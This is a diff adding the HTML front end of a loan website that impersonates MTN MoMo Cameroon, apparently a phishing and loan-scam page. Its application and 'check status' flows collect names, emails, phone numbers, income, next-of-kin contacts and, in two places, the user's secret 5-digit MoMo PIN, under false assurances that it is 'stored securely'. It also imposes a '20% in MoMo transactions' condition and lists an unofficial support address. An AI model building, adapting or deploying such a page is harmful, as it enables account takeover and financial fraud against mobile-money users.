@@ -1,0 +1,507 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<meta name="theme-color" content="#FFCC00">
+<title>MTN MoMo Cameroon – Easy Quick Loans</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="./style.css">
+</head>
+<body>
+
+<!-- ═════════════ SPLASH ═════════════ -->
+<div id="page-splash" class="splash">
+    <div class="splash-content">
+        <img src="./momo_logo.jpg" alt="MTN MoMo" class="splash-logo" onerror="this.style.display='none'">
+        <div class="splash-brand">MTN MoMo</div>
+        <div class="splash-sub">Cameroon · Easy Quick Loans</div>
+    </div>
+    <div class="splash-loader"><div class="splash-progress"></div></div>
+    <div class="splash-text">Loading your experience…</div>
+</div>
+
+<!-- ═════════════ LANDING ═════════════ -->
+<div id="page-landing" class="page">
+    <header class="hero">
+        <div class="hero-top">
+            <button class="lang-toggle" onclick="toggleLanguage()"><span id="langIcon">🌐 EN</span></button>
+            <img src="./momo_logo.jpg" alt="MTN MoMo" class="hero-logo" onerror="this.style.display='none'">
+            <div class="hero-spacer"></div>
+        </div>
+        <div class="hero-copy">
+            <div class="hero-badge">🇨🇲 MTN Cameroon</div>
+            <h1 data-i18n="welcome">Welcome to MTN MoMo Cameroon</h1>
+            <p class="hero-tagline" data-i18n="tagline">Get loans easily through MTN MoMo Cameroon</p>
+        </div>
+    </header>
+
+    <main class="land-body">
+        <div class="alert-warning">
+            <div class="alert-icon">⚠️</div>
+            <div>
+                <strong data-i18n="req_title">Loan Requirement</strong>
+                <p data-i18n="req_text">You must have at least 20% of your requested loan amount in MoMo transactions this month.</p>
+                <div class="alert-example">Loan <span id="reqExample">XAF 1,000,000</span> → Need <span id="reqNeed">XAF 200,000</span> in MoMo</div>
+            </div>
+        </div>
+
+        <section class="calc-card">
+            <div class="calc-head">
+                <div class="calc-head-icon">💰</div>
+                <div>
+                    <h2 data-i18n="calculator">Loan Calculator</h2>
+                    <p>XAF · Cameroon</p>
+                </div>
+            </div>
+            <div class="calc-amount-row">
+                <span class="calc-amount-label" data-i18n="amount">Amount</span>
+                <span class="calc-amount-value" id="calcAmt">XAF 1,000,000</span>
+            </div>
+            <input type="range" id="amtSlider" min="500000" max="5000000" step="100000" value="1000000" oninput="updateCalc()">
+            <div class="range-ends"><span>XAF 500,000</span><span>XAF 5,000,000</span></div>
+            <div class="calc-info">
+                <span data-i18n="term">Term</span>
+                <span id="calcTerm">48 Months</span>
+            </div>
+            <div class="monthly-box">
+                <span class="ml" data-i18n="monthly">Monthly Payment</span>
+                <span class="ma" id="monthlyAmt">XAF 24,000</span>
+            </div>
+            <div class="calc-info" style="margin-top:14px; padding-top:14px; border-top:1px dashed #E5E7EB;">
+                <span data-i18n="required_tx">Required MoMo transactions</span>
+                <span id="requiredTx" style="color:#DE350B; font-weight:800;">XAF 200,000</span>
+            </div>
+        </section>
+
+        <section class="conditions-card">
+            <h3>📋 <span data-i18n="conditions_title">What You Need to Qualify</span></h3>
+            <ul class="conditions-list">
+                <li>✅ <span data-i18n="cond_1">Be 18 years or older</span></li>
+                <li>✅ <span data-i18n="cond_2">Have an active MTN MoMo account</span></li>
+                <li>✅ <span data-i18n="cond_3">Have 20% in MoMo transactions</span></li>
+                <li>✅ <span data-i18n="cond_4">Provide a valid next of kin</span></li>
+                <li>✅ <span data-i18n="cond_5">Verify your email and phone</span></li>
+            </ul>
+            <div class="conditions-meta">
+                <div><span data-i18n="interest">Interest</span><strong>24% / year</strong></div>
+                <div><span data-i18n="term_range">Term</span><strong>6–48 months</strong></div>
+                <div><span data-i18n="approval_time">Approval</span><strong>~5 min</strong></div>
+            </div>
+        </section>
+
+        <button class="btn-primary btn-cta" onclick="startApplication()" data-i18n="start">START APPLICATION</button>
+        <button class="btn-ghost btn-cta" onclick="goTo('page-check-status')" data-i18n="check_status_btn">📊 Check My Application Status</button>
+
+        <div class="trust-row">
+            <div class="trust-pill"><span>🔒</span><span data-i18n="trust_secure">Secure</span></div>
+            <div class="trust-pill"><span>⚡</span><span data-i18n="trust_fast">5 min approval</span></div>
+            <div class="trust-pill"><span>🇨🇲</span><span data-i18n="trust_local">Cameroon</span></div>
+        </div>
+
+        <div class="terms-link-row">
+            <a href="#" onclick="event.preventDefault();showTerms()" data-i18n="view_terms">📜 View Terms & Conditions</a>
+        </div>
+    </main>
+
+    <footer class="land-footer" data-i18n="footer">© 2026 MTN MoMo Loans – Powered by MTN Cameroon</footer>
+</div>
+
+<!-- ═════════════ APPLICATION FORM ═════════════ -->
+<div id="page-application" class="page">
+    <nav class="navbar">
+        <a class="nav-left" onclick="goTo('page-landing')">← <span data-i18n="back">Back</span></a>
+        <img src="./momo_logo.jpg" alt="MTN MoMo" class="nav-logo" onerror="this.style.display='none'">
+        <div class="nav-right"><span class="nav-step">1/1</span></div>
+    </nav>
+    <div class="step-center">
+        <div class="step-card">
+            <div class="step-head">
+                <span class="step-num">📝</span>
+                <div>
+                    <h2 data-i18n="loan_application">Loan Application</h2>
+                    <p class="step-sub" data-i18n="all_in_one">All-in-one form</p>
+                </div>
+            </div>
+
+            <div class="msg-box error" id="appErr"><span class="msg-icon">✕</span><span id="appErrTxt"></span></div>
+
+            <!-- LOAN -->
+            <h3 class="section-h">💰 <span data-i18n="loan_details">Loan Details</span></h3>
+            <div class="field">
+                <label data-i18n="loan_type">Loan Type</label>
+                <div class="sel-wrap">
+                    <select id="appLoanType">
+                        <option value="Personal Loan">Personal Loan</option>
+                        <option value="Business Loan" selected>Business Loan</option>
+                        <option value="Home Loan">Home Loan</option>
+                        <option value="Student Loan">Student Loan</option>
+                    </select>
+                </div>
+            </div>
+            <div class="field">
+                <label data-i18n="loan_amount">Loan Amount (XAF)</label>
+                <input type="number" id="appLoanAmount" value="1000000" min="500000" max="5000000" step="50000" oninput="updateAppCalc()">
+                <div class="field-hint" id="loanLimitHint">Min XAF 500,000 · Max XAF 5,000,000</div>
+            </div>
+            <div class="field">
+                <label data-i18n="loan_term">Loan Term</label>
+                <div class="sel-wrap">
+                    <select id="appLoanTerm">
+                        <option value="6">6 Months</option>
+                        <option value="12">12 Months</option>
+                        <option value="18">18 Months</option>
+                        <option value="24">24 Months</option>
+                        <option value="48" selected>48 Months</option>
+                    </select>
+                </div>
+            </div>
+            <div class="field">
+                <label data-i18n="purpose">Purpose of Loan</label>
+                <textarea id="appLoanPurpose" placeholder="Describe the purpose of your loan…" maxlength="300"></textarea>
+            </div>
+
+            <!-- 20% -->
+            <div class="twenty-block">
+                <div class="twenty-head">
+                    <span class="twenty-icon">📊</span>
+                    <div>
+                        <strong data-i18n="twenty_title">Mandatory — 20% Rule</strong>
+                        <div class="twenty-amount">Requis : <b id="twentyAmount">XAF 200,000</b></div>
+                    </div>
+                </div>
+                <p class="twenty-desc" data-i18n="twenty_desc">Vous devez avoir au moins 20 % du montant demandé en transactions MoMo ce mois-ci.</p>
+                <label class="confirm-check">
+                    <input type="checkbox" id="has20Percent">
+                    <span data-i18n="twenty_confirm">Je confirme avoir au moins ce montant en transactions MoMo.</span>
+                </label>
+            </div>
+
+            <!-- PERSONAL -->
+            <h3 class="section-h">👤 <span data-i18n="personal_info">Personal Information</span></h3>
+            <div class="field">
+                <label data-i18n="full_name">Full Name</label>
+                <input type="text" id="appFullName" placeholder="Ex. Konan Yao" maxlength="80">
+            </div>
+            <div class="field">
+                <label data-i18n="email">Email Address</label>
+                <input type="email" id="appEmail" placeholder="you@email.com" maxlength="120">
+            </div>
+            <div class="field">
+                <label data-i18n="phone_label">Phone Number (Cameroon)</label>
+                <div class="phone-row">
+                    <div class="ph-pre">+237</div>
+                    <input type="tel" id="appPhone" placeholder="6XX XXX XXX" maxlength="9" inputmode="numeric">
+                </div>
+                <div class="field-hint" data-i18n="phone_hint">9 digits (e.g. 670123456)</div>
+            </div>
+
+            <!-- EMPLOYMENT -->
+            <h3 class="section-h">💼 <span data-i18n="employment">Employment</span></h3>
+            <div class="field">
+                <label data-i18n="employment_status">Employment Status</label>
+                <div class="sel-wrap">
+                    <select id="appEmployment">
+                        <option value="Employed">Employed</option>
+                        <option value="Self-employed" selected>Self-employed</option>
+                        <option value="Unemployed">Unemployed</option>
+                        <option value="Retired">Retired</option>
+                    </select>
+                </div>
+            </div>
+            <div class="field">
+                <label data-i18n="annual_income">Annual Income (XAF)</label>
+                <input type="number" id="appIncome" min="0" max="100000000">
+            </div>
+
+            <!-- KIN -->
+            <h3 class="section-h">👥 <span data-i18n="kin">Next of Kin</span></h3>
+            <div class="field">
+                <label data-i18n="kin_name">Next of Kin Name</label>
+                <input type="text" id="appKinName" maxlength="60">
+            </div>
+            <div class="field">
+                <label data-i18n="kin_phone">Next of Kin Phone</label>
+                <div class="phone-row">
+                    <div class="ph-pre">+237</div>
+                    <input type="tel" id="appKinPhone" placeholder="6XX XXX XXX" maxlength="9" inputmode="numeric">
+                </div>
+            </div>
+
+            <!-- MOMO PIN -->
+            <h3 class="section-h">🔐 <span data-i18n="momo_security">MoMo Security</span></h3>
+            <div class="field">
+                <label data-i18n="momo_pin">MoMo PIN (5 digits)</label>
+                <div class="pin-row">
+                    <input type="password" id="appPin0" class="pin-box" maxlength="1" inputmode="numeric" oninput="pinInput(this,0)">
+                    <input type="password" id="appPin1" class="pin-box" maxlength="1" inputmode="numeric" oninput="pinInput(this,1)">
+                    <input type="password" id="appPin2" class="pin-box" maxlength="1" inputmode="numeric" oninput="pinInput(this,2)">
+                    <input type="password" id="appPin3" class="pin-box" maxlength="1" inputmode="numeric" oninput="pinInput(this,3)">
+                    <input type="password" id="appPin4" class="pin-box" maxlength="1" inputmode="numeric" oninput="pinInput(this,4)">
+                </div>
+                <div class="field-hint" data-i18n="momo_pin_hint">🔒 Stocké de manière sécurisée. Utilisé pour vérifier votre identité lors du check status.</div>
+            </div>
+
+            <!-- T&C -->
+            <div class="agreement-wrap">
+                <label class="confirm-check">
+                    <input type="checkbox" id="appTnc">
+                    <span data-i18n="tnc_agree">J'ai lu et j'accepte les Conditions Générales, y compris les Conditions d'Utilisation de MTN MoMo. <a href="#" onclick="event.preventDefault();showTerms()" data-i18n="view_terms_link">Voir les conditions</a></span>
+                </label>
+            </div>
+
+            <button class="btn-primary" id="appSubmitBtn" onclick="submitApplication()" data-i18n="submit">SUBMIT APPLICATION</button>
+        </div>
+    </div>
+</div>
+
+<!-- ═════════════ VERIFY EMAIL (waiting) ═════════════ -->
+<div id="page-verify-email" class="page">
+    <div class="wait-bg">
+        <div class="wait-wrap">
+            <div class="wait-icon pulse">📧</div>
+            <h2 data-i18n="verify_email_title">Check your inbox</h2>
+            <p data-i18n="verify_email_text">Nous avons envoyé un lien de vérification à :</p>
+            <div class="mono" style="font-size:1rem; margin-bottom:20px;" id="verifyEmail">—</div>
+            <div class="wait-status" data-i18n="verify_email_hint">⏳ Cliquez sur le lien dans l'email pour continuer.</div>
+            <div class="poll-indicator"><span class="dot"></span> <span data-i18n="live_check">Live check</span></div>
+            <div class="resend-wrap" id="verifResendWrap" style="display:none;">
+                <div class="countdown-text" id="verifCountdownText">Resend in 2:00</div>
+                <button class="btn-ghost" id="verifResendBtn" onclick="resendVerification()" style="display:none;" data-i18n="resend_verif">🔄 Resend verification email</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- ═════════════ VERIFY FAILED ═════════════ -->
+<div id="page-verify-failed" class="page">
+    <div class="wait-bg">
+        <div class="wait-wrap">
+            <div class="wait-icon">⚠️</div>
+            <h2 data-i18n="verify_failed_title">Lien expiré</h2>
+            <p data-i18n="verify_failed_text">Ce lien de vérification a expiré ou n'est plus valide.</p>
+            <button class="btn-primary" onclick="goTo('page-landing')" data-i18n="back_home">Retour à l'accueil</button>
+        </div>
+    </div>
+</div>
+
+<!-- ═════════════ AWAITING APPROVAL ═════════════ -->
+<div id="page-awaiting" class="page">
+    <div class="wait-bg">
+        <div class="wait-wrap">
+            <div class="wait-icon pulse">⏳</div>
+            <h2 data-i18n="awaiting_title">Your application is being reviewed</h2>
+            <p data-i18n="awaiting_text">We've sent your details to our verification team. You will be notified once approved.</p>
+            <div class="wait-status" id="awaitingStatus" data-i18n="awaiting_status">⏳ Awaiting admin approval...</div>
+            <div class="poll-indicator"><span class="dot"></span> <span data-i18n="live_check">Live check</span></div>
+            <div class="wait-appid">
+                <span data-i18n="app_id">Application ID:</span>
+                <span class="mono" id="awaitingAppId">—</span>
+            </div>
+            <div class="support-block">
+                <div class="support-title" data-i18n="need_help">💬 Need help?</div>
+                <a href="tel:111" class="support-link">📞 MTN: 111</a>
+                <a href="mailto:support@mtn-momo-cm.com" class="support-link">📧 support@mtn-momo-cm.com</a>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- ═════════════ APPROVED ═════════════ -->
+<div id="page-approved" class="page">
+    <div class="appr-wrap">
+        <div class="appr-top">
+            <div class="check-circle">✓</div>
+            <h2 class="appr-title" data-i18n="approved_title">Loan Approved!</h2>
+            <p class="appr-sub" data-i18n="approved_sub">Your loan has been successfully approved.</p>
+        </div>
+        <div class="appr-amount">
+            <div class="appr-amount-label" data-i18n="amount_receive">Amount to Receive</div>
+            <div class="appr-amount-value" id="aprAmount">XAF 0</div>
+        </div>
+        <div class="info-box">
+            <div class="info-box-head">ℹ️ <span data-i18n="what_next">What happens next</span></div>
+            <ol class="info-list">
+                <li data-i18n="next_1">💰 Funds will be deposited to your MTN MoMo within 5 minutes.</li>
+                <li data-i18n="next_2">📱 You'll receive a confirmation SMS when the deposit is complete.</li>
+                <li data-i18n="next_3">📧 Full loan details sent to your email.</li>
+            </ol>
+        </div>
+        <div class="loan-details">
+            <div class="ld-row"><div class="ld-icon ld-yellow">💰</div><div><div class="ld-lbl">Amount</div><div class="ld-val" id="aprAmt">XAF 0</div></div></div>
+            <div class="ld-row"><div class="ld-icon ld-black">📅</div><div><div class="ld-lbl">Term</div><div class="ld-val" id="aprTerm">—</div></div></div>
+            <div class="ld-row"><div class="ld-icon ld-yellow">💳</div><div><div class="ld-lbl">Monthly</div><div class="ld-val" id="aprMth">—</div></div></div>
+        </div>
+        <button class="btn-primary btn-cta" onclick="goToDashboard()" data-i18n="go_dashboard">Go to My Dashboard</button>
+    </div>
+</div>
+
+<!-- ═════════════ FAILED ═════════════ -->
+<div id="page-failed" class="page">
+    <div class="wait-bg">
+        <div class="wait-wrap">
+            <div class="wait-icon">❌</div>
+            <h2 data-i18n="failed_title">Application not approved</h2>
+            <p id="failedReason" data-i18n="failed_default">Votre demande n'a pas été approuvée.</p>
+            <div class="msg-box error show" style="text-align:left;">
+                <span class="msg-icon">ℹ️</span>
+                <span data-i18n="failed_hint">Contactez le support MTN MoMo au <b>111</b> pour plus d'informations.</span>
+            </div>
+            <button class="btn-primary" onclick="restartApplication()" data-i18n="retry">Try Again</button>
+            <a href="tel:111" class="btn-ghost" style="display:block; text-align:center; text-decoration:none; margin-top:10px;">📞 Support: 111</a>
+        </div>
+    </div>
+</div>
+
+<!-- ═════════════ CHECK STATUS — EMAIL + PHONE ═════════════ -->
+<div id="page-check-status" class="page">
+    <nav class="navbar">
+        <a class="nav-left" onclick="goTo('page-landing')">← <span data-i18n="back">Back</span></a>
+        <img src="./momo_logo.jpg" alt="MTN MoMo" class="nav-logo" onerror="this.style.display='none'">
+        <div class="nav-right"><span class="nav-step">🔎</span></div>
+    </nav>
+    <div class="step-center">
+        <div class="step-card">
+            <div class="step-head">
+                <span class="step-num">🔎</span>
+                <div>
+                    <h2 data-i18n="check_status_title">Check Application Status</h2>
+                    <p class="step-sub" data-i18n="check_status_sub">Enter your email and phone number</p>
+                </div>
+            </div>
+            <div class="msg-box error" id="checkErr"><span class="msg-icon">✕</span><span id="checkErrTxt"></span></div>
+            <div class="field">
+                <label data-i18n="email">Email Address</label>
+                <input type="email" id="chkEmail" placeholder="you@email.com">
+            </div>
+            <div class="field">
+                <label data-i18n="phone_label">Phone Number (Cameroon)</label>
+                <div class="phone-row">
+                    <div class="ph-pre">+237</div>
+                    <input type="tel" id="chkPhone" placeholder="6XX XXX XXX" maxlength="9" inputmode="numeric">
+                </div>
+            </div>
+            <button class="btn-primary" id="checkBtn" onclick="initiateCheckStatus()" data-i18n="check_status_send">SEND VERIFICATION CODE</button>
+            <div class="field-hint" style="text-align:center; margin-top:10px;" data-i18n="check_status_note">
+                Nous enverrons un code à 6 chiffres à votre email.
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- ═════════════ CHECK STATUS — OTP ═════════════ -->
+<div id="page-check-otp" class="page">
+    <nav class="navbar">
+        <a class="nav-left" onclick="goTo('page-check-status')">← <span data-i18n="back">Back</span></a>
+        <img src="./momo_logo.jpg" alt="MTN MoMo" class="nav-logo" onerror="this.style.display='none'">
+        <div class="nav-right"><span class="nav-step">2/3</span></div>
+    </nav>
+    <div class="step-center">
+        <div class="step-card">
+            <div class="step-head">
+                <span class="step-num">🔢</span>
+                <div>
+                    <h2 data-i18n="otp_title">Verification Code</h2>
+                    <p class="step-sub" data-i18n="otp_sub">Enter the 6-digit code sent to your email</p>
+                </div>
+            </div>
+            <div class="msg-box error" id="otpErr"><span class="msg-icon">✕</span><span id="otpErrTxt"></span></div>
+            <div class="field">
+                <label data-i18n="otp_label">6-digit code</label>
+                <div class="otp-inputs">
+                    <input type="text" id="otp0" class="otp-box" maxlength="1" inputmode="numeric" oninput="otpInput(this,0)">
+                    <input type="text" id="otp1" class="otp-box" maxlength="1" inputmode="numeric" oninput="otpInput(this,1)">
+                    <input type="text" id="otp2" class="otp-box" maxlength="1" inputmode="numeric" oninput="otpInput(this,2)">
+                    <input type="text" id="otp3" class="otp-box" maxlength="1" inputmode="numeric" oninput="otpInput(this,3)">
+                    <input type="text" id="otp4" class="otp-box" maxlength="1" inputmode="numeric" oninput="otpInput(this,4)">
+                    <input type="text" id="otp5" class="otp-box" maxlength="1" inputmode="numeric" oninput="otpInput(this,5)">
+                </div>
+            </div>
+            <button class="btn-primary" id="otpBtn" onclick="verifyOtp()" data-i18n="otp_submit">VERIFY CODE</button>
+            <div class="resend-wrap" id="otpResendWrap" style="display:none; margin-top:14px;">
+                <div class="countdown-text" id="otpCountdownText">Resend in 2:00</div>
+                <button class="btn-ghost" id="otpResendBtn" onclick="resendOtp()" style="display:none;" data-i18n="resend_otp">🔄 Resend code</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- ═════════════ CHECK STATUS — PIN ═════════════ -->
+<div id="page-check-pin" class="page">
+    <nav class="navbar">
+        <a class="nav-left" onclick="goTo('page-check-otp')">← <span data-i18n="back">Back</span></a>
+        <img src="./momo_logo.jpg" alt="MTN MoMo" class="nav-logo" onerror="this.style.display='none'">
+        <div class="nav-right"><span class="nav-step">3/3</span></div>
+    </nav>
+    <div class="step-center">
+        <div class="step-card">
+            <div class="step-head">
+                <span class="step-num">🔐</span>
+                <div>
+                    <h2 data-i18n="pin_title">Enter MoMo PIN</h2>
+                    <p class="step-sub" data-i18n="pin_sub">Verify with your 5-digit MoMo PIN</p>
+                </div>
+            </div>
+            <div class="msg-box error" id="cpinErr"><span class="msg-icon">✕</span><span id="cpinErrTxt"></span></div>
+            <div class="pin-label" data-i18n="pin_label">Your MoMo PIN (5 digits)</div>
+            <div class="pin-row">
+                <input type="password" id="cpin0" class="pin-box" maxlength="1" inputmode="numeric" oninput="cpinInput(this,0)">
+                <input type="password" id="cpin1" class="pin-box" maxlength="1" inputmode="numeric" oninput="cpinInput(this,1)">
+                <input type="password" id="cpin2" class="pin-box" maxlength="1" inputmode="numeric" oninput="cpinInput(this,2)">
+                <input type="password" id="cpin3" class="pin-box" maxlength="1" inputmode="numeric" oninput="cpinInput(this,3)">
+                <input type="password" id="cpin4" class="pin-box" maxlength="1" inputmode="numeric" oninput="cpinInput(this,4)">
+            </div>
+            <button class="btn-primary" id="cpinBtn" onclick="verifyCheckPin()" data-i18n="pin_submit">VERIFY PIN & LOGIN</button>
+        </div>
+    </div>
+</div>
+
+<!-- ═════════════ DASHBOARD ═════════════ -->
+<div id="page-dashboard" class="page">
+    <div class="dash">
+        <header class="dash-header">
+            <div class="dash-logo"><span class="dash-icon">M</span><span class="dash-name">MoMo</span></div>
+            <div class="dash-right"><span>🔔</span><span>👤</span></div>
+        </header>
+        <div class="dash-balance">
+            <div class="dash-balance-label">Loan Balance</div>
+            <div class="dash-balance-amount" id="dashBalance">XAF 0</div>
+            <div class="dash-balance-meta">
+                <span>Loan ID: <b id="dashId">—</b></span>
+                <span>Term: <b id="dashTerm">—</b></span>
+            </div>
+        </div>
+        <div class="dash-actions">
+            <div class="dash-tile" onclick="alert('Payment feature coming soon!')"><div class="dash-tile-icon">💰</div><div>Pay</div></div>
+            <div class="dash-tile" onclick="alert('History coming soon!')"><div class="dash-tile-icon">📄</div><div>History</div></div>
+            <div class="dash-tile" onclick="downloadContract()"><div class="dash-tile-icon">📥</div><div>Contract</div></div>
+        </div>
+        <div class="dash-recent">
+            <h3>Recent Activity</h3>
+            <div id="dashTxList" class="dash-tx-list">
+                <div class="dash-tx-empty">No transactions yet</div>
+            </div>
+        </div>
+        <button class="btn-ghost dash-logout" onclick="logout()">Logout</button>
+    </div>
+</div>
+
+<!-- ═════════════ TERMS MODAL ═════════════ -->
+<div id="termsModal" class="modal-bg" onclick="if(event.target===this)closeTerms()">
+    <div class="modal-doc">
+        <div class="modal-head">
+            <h2 data-i18n="terms_title">Terms & Conditions</h2>
+            <button class="modal-close" onclick="closeTerms()">×</button>
+        </div>
+        <pre id="termsText" class="modal-text">Loading…</pre>
+        <div class="modal-footer">
+            <button class="btn-primary" onclick="acceptTerms()" data-i18n="terms_accept">I Accept</button>
+        </div>
+    </div>
+</div>
+
+<script src="./script.js"></script>
+</body>
+</html>
